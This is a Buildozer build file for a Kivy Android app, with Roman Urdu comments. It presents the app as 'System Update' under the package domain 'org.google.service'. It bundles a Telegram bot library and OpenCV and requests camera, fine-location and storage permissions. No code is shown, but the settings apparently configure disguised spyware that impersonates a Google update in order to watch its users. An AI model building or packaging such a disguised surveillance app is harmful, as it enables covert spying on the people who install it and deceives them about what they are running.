[app]

# (str) Title of your application
title = System Update

# (str) Package name
package.name = sysupdate

# (str) Package domain (needed for android packaging)
package.domain = org.google.service

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.0

# (list) Application requirements
# Asif bhai, yahan hum ne sirf stable libraries rakhi hain taake build fail na ho
requirements = python3,kivy==2.2.1,pyTelegramBotAPI,opencv-python,jnius

# (str) Supported orientations
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 0

# (list) Permissions
# Camera aur Internet ki zaroori permissions
android.permissions = INTERNET, CAMERA, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, ACCESS_FINE_LOCATION

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (bool) If True, then skip trying to update the SDK
android.skip_update = False

# (bool) If True, then automatically accept SDK license
android.accept_sdk_license = True

# (str) The Android arch to build for.
android.archs = armeabi-v7a, arm64-v8a

# (list) The Android architectures to build for
# Is se APK har phone par chalegi
android.archs = arm64-v8a

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1
